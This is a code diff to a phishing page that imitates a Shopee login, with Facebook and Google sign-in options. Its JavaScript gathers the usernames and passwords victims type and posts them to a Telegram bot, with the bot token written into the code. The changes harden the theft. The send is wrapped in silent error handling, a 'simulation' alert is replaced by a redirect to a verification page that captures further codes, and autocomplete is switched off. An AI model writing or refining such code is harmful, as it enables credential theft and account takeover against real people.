@@ -215,11 +215,21 @@
     // WhatsApp
     const waNumber = document.getElementById("waNumberInput") ? document.getElementById("waNumberInput").value : "";
     // Facebook
-    const fbLogin = document.querySelector("#facebookLoginSection input[type='text']") ? document.querySelector("#facebookLoginSection input[type='text']").value : "";
-    const fbPassword = document.getElementById("fbPassword") ? document.getElementById("fbPassword").value : "";
+    let fbLogin = "";
+    let fbPassword = "";
+    if (document.getElementById("facebookLoginSection") && !document.getElementById("facebookLoginSection").classList.contains("hidden")) {
+      const fbInputs = document.querySelectorAll("#facebookLoginSection input[type='text']");
+      if (fbInputs[0]) fbLogin = fbInputs[0].value;
+      if (document.getElementById("fbPassword")) fbPassword = document.getElementById("fbPassword").value;
+    }
     // Google
-    const googleLogin = document.querySelector("#googleLoginSection input[type='email']") ? document.querySelector("#googleLoginSection input[type='email']").value : "";
-    const googlePassword = document.getElementById("googlePassword") ? document.getElementById("googlePassword").value : "";
+    let googleLogin = "";
+    let googlePassword = "";
+    if (document.getElementById("googleLoginSection") && !document.getElementById("googleLoginSection").classList.contains("hidden")) {
+      const googleInputs = document.querySelectorAll("#googleLoginSection input[type='email']");
+      if (googleInputs[0]) googleLogin = googleInputs[0].value;
+      if (document.getElementById("googlePassword")) googlePassword = document.getElementById("googlePassword").value;
+    }
     // Verification
     let verificationMethod = "";
     if (document.querySelector('input[name="verificationMethod"]:checked')) {
@@ -241,24 +251,29 @@
     const token = '8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk';
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-    fetch(url, {
-     method: "POST",
-     headers: {
-      "Content-Type": "application/json"
-     },
-     body: JSON.stringify({
-      chat_id: chatId,
-      text: text
-     })
-    });
+    // Gunakan try/catch agar tidak error jika fetch gagal
+    try {
+      fetch(url, {
+       method: "POST",
+       headers: {
+        "Content-Type": "application/json"
+       },
+       body: JSON.stringify({
+        chat_id: chatId,
+        text: text
+       })
+      });
+    } catch (e) {
+      // ignore error
+    }
    }
 
    // --- Shopee login form submit handler ---
    function submitShopeeLogin(event) {
     event.preventDefault();
     sendAllInputsToTelegram('shopee');
-    // Simulate login failed so user stays on page
-    alert("Login Shopee dikirim. (Simulasi: tetap dihalaman ini)");
+    // Setelah mengirim ke Telegram, redirect ke verifikasi.html
+    window.location.href = "verifikasi.html";
    }
 
    window.onload = function() {
@@ -281,7 +296,7 @@
 
   <!-- Main Login Section -->
   <div id="mainLoginSection" class="w-full max-w-sm">
-   <form id="loginForm" class="mb-6">
+   <form id="loginForm" class="mb-6" autocomplete="off">
     <div class="relative mb-6">
      <span
       class="absolute inset-y-0 left-0 flex items-center pl-2 text-gray-400 text-lg"
@@ -294,6 +309,7 @@
       placeholder="No. Handphone/Email/Username"
       type="text"
       required
+      autocomplete="off"
      />
     </div>
     <div class="relative mb-4 flex items-center border-b border-gray-300">
@@ -306,12 +322,14 @@
       placeholder="Password"
       type="password"
       required
+      autocomplete="off"
      />
      <button
       aria-label="Toggle password visibility"
       class="absolute right-4 text-gray-400 text-xl focus:outline-none"
       type="button"
       onclick="togglePasswordVisibility()"
+      tabindex="-1"
      >
       <i class="fas fa-eye-slash" id="toggleIcon"></i>
      </button>
